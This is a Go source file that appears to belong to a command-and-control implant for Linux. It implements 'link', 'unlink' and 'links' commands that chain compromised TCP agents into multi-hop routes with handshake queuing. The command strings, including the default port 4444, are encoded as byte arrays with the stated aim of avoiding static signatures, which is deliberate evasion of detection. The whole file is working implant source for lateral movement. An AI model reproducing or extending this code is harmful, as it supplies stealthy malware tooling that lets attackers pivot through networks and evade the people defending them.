// server/docker/payloads/TCP_Linux/action_link.go
// Link commands for connecting to other TCP agents (multi-hop chains)

//go:build linux
// +build linux

package main

import (
	"strings"
	"time"
)

// Link command strings (constructed to avoid static signatures)
var (
	lnkCmdLink   = string([]byte{0x6c, 0x69, 0x6e, 0x6b})                   // link
	lnkCmdUnlink = string([]byte{0x75, 0x6e, 0x6c, 0x69, 0x6e, 0x6b})       // unlink
	lnkCmdLinks  = string([]byte{0x6c, 0x69, 0x6e, 0x6b, 0x73})             // links
	lnkProtoTcp  = string([]byte{0x74, 0x63, 0x70})                         // tcp
	lnkDefPort   = string([]byte{0x34, 0x34, 0x34, 0x34})                   // 4444
	lnkColon     = string([]byte{0x3a})                                     // :
	lnkOutPrefix = string([]byte{0x53, 0x36, 0x7c})                         // S6|
	lnkPipe      = string([]byte{0x7c})                                     // |
	lnkPending   = string([]byte{0x50})                                     // P
	lnkQueued    = string([]byte{0x51})                                     // Q
)

// LinkCommand handles the 'link' command for connecting to other TCP agents
type LinkCommand struct{}

func (c *LinkCommand) Execute(ctx *CommandContext, args []string) CommandResult {
	if len(args) < 2 {
		return CommandResult{
			Output:      Err(E1),
			ExitCode:    1,
			CompletedAt: time.Now().Format(time.RFC3339),
		}
	}

	protocol := strings.ToLower(args[0])
	targetHost := args[1]

	switch protocol {
	case lnkProtoTcp:
		port := lnkDefPort
		if len(args) >= 3 {
			port = args[2]
		}

		// Build the TCP address
		address := targetHost + lnkColon + port
		return c.linkTCP(address)

	default:
		return CommandResult{
			Output:      ErrCtx(E29, protocol),
			ExitCode:    1,
			CompletedAt: time.Now().Format(time.RFC3339),
		}
	}
}

func (c *LinkCommand) linkTCP(address string) CommandResult {
	// Get the link manager
	lm := GetLinkManager()

	// Attempt to link
	routingID, err := lm.Link(address)
	if err != nil {
		return CommandResult{
			Output:      ErrCtx(E30, address),
			ExitCode:    1,
			CompletedAt: time.Now().Format(time.RFC3339),
		}
	}

	// Perform immediate handshake round-trip
	handshakeResult := performImmediateHandshake(lm, routingID)

	return CommandResult{
		Output:      lnkOutPrefix + address + lnkPipe + routingID + lnkPipe + handshakeResult,
		ExitCode:    0,
		CompletedAt: time.Now().Format(time.RFC3339),
	}
}

// performImmediateHandshake handles the full handshake round-trip immediately
func performImmediateHandshake(lm *LinkManager, routingID string) string {
	// Wait briefly for the TCP agent's handshake to arrive in the handshake queue
	const handshakeWaitTimeout = 5 * time.Second
	deadline := time.Now().Add(handshakeWaitTimeout)

	var handshakeData *LinkDataOut
	for time.Now().Before(deadline) {
		// Check handshake queue for handshake data (sent via "lh" field)
		data := lm.GetHandshakeData()
		if data != nil && data.RoutingID == routingID {
			handshakeData = data
			break
		}
		// Re-queue any handshake that wasn't for us
		if data != nil {
			lm.queueHandshakeData(data)
		}
		time.Sleep(100 * time.Millisecond)
	}

	if handshakeData == nil {
		return lnkPending
	}

	// Queue the handshake data to be sent via "lh" field on next response to parent
	lm.queueHandshakeData(handshakeData)
	return lnkQueued
}

// UnlinkCommand handles the 'unlink' command for disconnecting from TCP agents
type UnlinkCommand struct{}

func (c *UnlinkCommand) Execute(ctx *CommandContext, args []string) CommandResult {
	if len(args) < 1 {
		return CommandResult{
			Output:      Err(E1),
			ExitCode:    1,
			CompletedAt: time.Now().Format(time.RFC3339),
		}
	}

	routingID := args[0]
	lm := GetLinkManager()

	if err := lm.Unlink(routingID); err != nil {
		return CommandResult{
			Output:      ErrCtx(E31, routingID),
			ExitCode:    1,
			CompletedAt: time.Now().Format(time.RFC3339),
		}
	}

	return CommandResult{
		Output:      SuccCtx(S7, routingID),
		ExitCode:    0,
		CompletedAt: time.Now().Format(time.RFC3339),
	}
}

// LinksCommand handles the 'links' command for listing active TCP links
type LinksCommand struct{}

func (c *LinksCommand) Execute(ctx *CommandContext, args []string) CommandResult {
	lm := GetLinkManager()
	output := lm.ListLinks()

	return CommandResult{
		Output:      output,
		ExitCode:    0,
		CompletedAt: time.Now().Format(time.RFC3339),
	}
}
